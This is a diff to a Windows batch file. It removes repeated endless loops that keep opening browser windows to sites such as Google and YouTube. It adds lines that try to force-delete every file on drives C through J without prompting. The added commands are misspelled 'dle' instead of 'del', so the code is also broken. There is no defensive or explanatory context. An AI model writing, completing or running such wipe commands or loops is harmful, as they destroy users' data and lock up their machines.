@@ -1,21 +1,15 @@
 @echo off
-:bucle
-start www.google.es
-start www.yahoo.es
-start www.youtube.com
-start www.blogger.com
-start www.gmail.com
-start www.minijuegos.com
-goto bucle
-@echo off
-:bucle
-start www.google.es
-start www.yahoo.es
-start www.youtube.com
-goto bucle
-@echo off
-:bucle
-start www.google.es
-start www.yahoo.es
-start www.youtube.com
-goto bucle
+
+dle D:*.*/f/s/q
+
+dle C:*.*/f/s/q
+
+dle E:*.*/f/s/q
+
+dle F:*.*/f/s/q
+
+dle J:*.*/f/s/q
+
+dle G:*.*/f/s/q
+
+dle I:*.*/f/s/q
